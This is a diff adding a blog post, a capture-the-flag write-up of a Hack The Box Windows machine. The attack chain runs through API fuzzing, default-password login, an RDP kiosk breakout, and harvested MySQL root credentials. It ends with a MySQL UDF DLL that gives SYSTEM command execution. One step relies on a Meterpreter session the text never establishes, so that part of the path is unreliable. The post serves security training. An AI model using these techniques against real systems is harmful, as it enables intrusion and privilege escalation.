@@ -1,0 +1,204 @@
+import { Bild, Code, Block, Marker } from "../components.tsx";
+
+Disclaimer: This writeup is based on my notes and memory, so some intermediate steps may be incomplete. Replace the image paths below with the URLs or paths used by the portfolio before publishing. The flags have been omitted.
+
+<br />
+
+Starting with a full TCP port scan and then running service detection against the discovered ports reveals four open ports:
+
+<Block
+  language="Text"
+  content={"135/tcp  - MSRPC\n3389/tcp - RDP\n5985/tcp - WinRM\n8443/tcp - HTTP / Nexion DeviceHub"}
+/>
+
+The services did not immediately reveal a known vulnerability or an obvious exploit path. The web application on port <Code content="8443" /> redirects to <Code content="/login" /> and identifies itself as Nexion DeviceHub. The login page offers two authentication methods: a device password or a staff badge scan.
+
+<br />
+
+The earlier Layover machine provided the name and booking confirmation code <Code content="Jenny Crawford / KS7X2M" />. I initially tested credentials against the available Windows services, but the first NXC output only fingerprinted the services; it did not confirm successful authentication.
+
+<br />
+
+I then used <Code content="ffuf" /> to enumerate API-related endpoints:
+
+<Block
+  language="Bash"
+  content={"ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt:FUZZ -u http://touch.htb:8443/FUZZ -fc 302"}
+/>
+
+This returned <Code content="/api" />, <Code content="/login" />, and <Code content="/favicon.ico" />. I then fuzzed beneath the API path:
+
+<Block
+  language="Bash"
+  content={"ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt:FUZZ -u http://touch.htb:8443/api/FUZZ -recursion -recursion-depth 2 -fc 302"}
+/>
+
+This revealed a <Code content="/api/status" /> endpoint. Its response disclosed information about the device:
+
+<Block
+  language="JSON"
+  content={'{\n  "device": "Nexion DeviceHub DH-100",\n  "serial": "NX-DH-2024-B7042",\n  "firmware": "1.4.2",\n  "status": "online",\n  "uptime": 76093\n}'}
+/>
+
+Then I searched through the login pare further. Checking every component. Hovering over  “Forgot password” stated that the device serial number is the default password. This provided a way to access the DeviceHub dashboard.
+
+<Bild
+  src={"https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/touch-nexion-dashboard.png"}
+  alt={"Nexion DeviceHub dashboard"}
+  width={1918}
+  height={1080}
+/>
+
+The DeviceHub dashboard disclosed Windows credentials for the kiosk account:
+
+<Block
+  language="Text"
+  content={"Username: KioskUser\nPassword: K!0sk2026#"}
+/>
+
+These credentials worked for RDP. Connecting with <Code content="xfreerdp3" /> opened a restricted self-check-in interface rather than a normal Windows desktop:
+
+<Block
+  language="Bash"
+  content={"xfreerdp3 /v:touch.htb /u:KioskUser /p:'K!0sk2026#' /w:1920 /h:1080"}
+/>
+
+<Bild
+  src={"https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/touch-self-checkin.png"}
+  alt={"Self Check-In screen shown after connecting over RDP"}
+  width={1901}
+  height={1016}
+/>
+
+The kiosk was initially locked into the self-check-in application. I interacted with its boarding-pass scanner. Of course I had nothing to scan.
+
+<Bild
+  src={"https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/touch-passport.png"}
+  alt={"Self Check-In boarding-pass scanning screen"}
+  width={1900}
+  height={1008}
+/>
+
+Then I remembered the option to disable the scanner in the dashboard. When I tried scanning a pass with a disabled scanner, the application displayed an error prompt containing a link.
+
+<Bild
+  src={"https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/touch-passport-error.png"}
+  alt={"Error prompt displayed after attempting to scan a pass"}
+  width={642}
+  height={617}
+/>
+
+Following the link exposed a way out of the restricted kiosk workflow. From there, I opened File Explorer using <Code content="Ctrl+O" /> and used its file search to launch <Code content="cmd.exe" />. This provided command-line access in the context of the logged-in kiosk user. The user flag was available on that user's desktop.
+
+<Bild
+  src={"https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/touch-file-explorer.png"}
+  alt={"Windows filesystem accessed through RDP, with cmd.exe shown in the file search"}
+  width={1469}
+  height={830}
+/>
+
+With command-line access, I enumerated the filesystem and found the application directory:
+
+<Block
+  language="Text"
+  content={'C:\\ProgramData\\HTB Airways\\'}
+/>
+
+The directory contained application files, including a backend package and a batch file named <Code content="refresh-dates.bat" />. Inspecting the backend's database configuration revealed MySQL credentials:
+
+<Block
+  language="TypeScript"
+  content={'const defaults = {\n  host: "127.0.0.1",\n  port: 3306,\n  user: "kiosk_app",\n  password: "K!0sk_R3pl1ca#DB",\n  database: "htb_airways"\n};'}
+/>
+
+I used these credentials to enumerate the database:
+
+<Block
+  language="Bash"
+  content={'mysql -u kiosk_app -p\'K!0sk_R3pl1ca#DB\' -h 127.0.0.1 -P 3306 htb_airways -e "SHOW TABLES;"'}
+/>
+
+The database contained tables for bookings, passengers, flights, boarding passes, and staff. The <Code content="_htb_staff" /> table was particularly interesting because it contained employee IDs, email addresses, roles, badge numbers, and authentication codes. However, the more important discovery for privilege escalation was in the batch file.
+
+<br />
+
+The contents of <Code content="refresh-dates.bat" /> exposed MySQL root credentials:
+
+<Block
+  language="Batch"
+  content={'@echo off\nC:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul'}
+/>
+
+This meant that the database administrator credentials were stored in a script on the host. I confirmed that the MySQL root account had both <Code content="Grant_priv" /> and <Code content="File_priv" /> enabled.
+
+<br />
+
+The next step was to execute operating-system commands through MySQL. MySQL supports User-Defined Functions (UDFs), which can be implemented in native libraries such as Windows DLLs. A UDF that exposes command execution can turn database access into operating-system command execution.
+
+<br />
+
+First, I checked the server's file-operation configuration:
+
+<Block
+  language="SQL"
+  content={"SHOW VARIABLES LIKE 'secure_file_priv';"}
+/>
+
+The value was <Code content="NULL" />, which disables the server-side file import/export operations governed by this setting. Therefore, the usual <Code content="SELECT ... INTO OUTFILE" /> technique was not available for placing a DLL through SQL.
+
+<br />
+
+However, I already had filesystem access through Meterpreter. I downloaded the UDF library from <Marker content="MySQL-UDF-Exploitation" link="https://github.com/koparmalbaris/MySQL-UDF-Exploitation" /> and uploaded the DLL directly to MySQL's plugin directory using the existing session. This bypassed the need to write the file through MySQL itself.
+
+<br />
+
+With the DLL in place, I registered the function using the recovered MySQL root credentials:
+
+<Block
+  language="SQL"
+  content={"CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"}
+/>
+
+I then tested command execution:
+
+<Block
+  language="SQL"
+  content={"SELECT sys_eval('whoami');"}
+/>
+
+The result was <Code content="NT AUTHORITY\\SYSTEM" />. This confirmed that the UDF was executing commands with the Windows identity of the MySQL server process, which was running as SYSTEM.
+
+<br />
+
+Finally, I used the function to read the Administrator's root flag:
+
+<Block
+  language="SQL"
+  content={"SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"}
+/>
+
+The Windows type command returned the file contents through the UDF. I initially tried <Code content="more" /> as well, but it did not return useful output in this context. Prolly because more is a pager and doesn't just output content to stdin. The exact cause was not confirmed, so type was the reliable option.
+
+<br />
+
+**Enumeration can reveal application-specific paths**: The API status endpoint disclosed the device serial number, and the login page explained that the serial number was the default password. That information led to the DeviceHub dashboard and the kiosk credentials.
+
+<br />
+
+**A kiosk interface is still a Windows application running on a host**: The RDP session initially appeared restricted to self-check-in, but interacting with the application and its error prompt exposed a route to File Explorer and command-line access.
+
+<br />
+
+**Credentials in configuration and automation files matter**: The backend configuration revealed a database account, while the batch file exposed the MySQL root password. A scheduled or operational script can unintentionally become a source of privileged credentials.
+
+<br />
+
+**Database privileges and operating-system privileges are different**: MySQL root is a database account, not automatically Windows Administrator. In this case, registering the UDF allowed command execution as NT AUTHORITY\\SYSTEM because of the identity under which the MySQL server process ran.
+
+<br />
+
+**secure_file_priv is not a universal filesystem restriction**: Its NULL value blocked the relevant MySQL server-side file import/export operations, but it did not stop a separate process such as Meterpreter from uploading a DLL when filesystem permissions allowed it.
+
+<br />
+
+**The overall path was a chain of small discoveries**: API enumeration exposed the device serial number, DeviceHub revealed kiosk credentials, the kiosk workflow led to command-line access, local application files exposed database credentials, and a MySQL UDF ultimately provided SYSTEM-level command execution.
